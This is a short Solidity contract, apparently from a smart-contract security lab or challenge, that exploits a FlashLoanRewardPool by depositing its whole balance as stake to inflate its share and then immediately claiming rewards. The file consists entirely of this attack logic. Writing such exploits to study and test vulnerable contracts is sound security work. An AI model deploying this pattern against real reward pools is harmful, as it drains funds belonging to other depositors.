// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FlashLoanRewardPool} from "../src/FlashLoanRewardPool.sol";

contract ExploitModule {
    FlashLoanRewardPool public targetContract;

    constructor(address _target) payable {
        targetContract = FlashLoanRewardPool(payable(_target));
    }

    function runExploit() external payable {
        // Step 1: Deposit stake to inflate the user's stake share
        targetContract.depositStake{value: address(this).balance}();

        // Step 2: Claim reward while the user's stake is inflated
        targetContract.claimReward();
    }

    receive() external payable {}
}